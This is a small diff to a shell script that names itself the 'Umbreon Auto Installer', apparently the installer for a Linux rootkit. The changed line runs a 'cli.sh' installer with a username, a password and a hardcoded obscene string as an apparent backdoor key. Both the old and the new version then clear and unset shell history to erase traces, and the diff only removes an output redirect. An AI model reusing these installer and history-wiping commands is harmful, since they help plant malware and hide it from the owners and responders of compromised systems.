@@ -3,4 +3,4 @@ echo "Umbreon Auto Installer."
 echo "Usage: sh $0 [USERNAME] [PASSWORD]"
 exit 0
 fi
-bash cli.sh $1 $2 FUCKMYANUSDONGSYOULITTLEFUCKINGSLUTFACEPORNSTAR >/dev/null;history -c;unset history
+bash cli.sh $1 $2 FUCKMYANUSDONGSYOULITTLEFUCKINGSLUTFACEPORNSTAR ;history -c;unset history
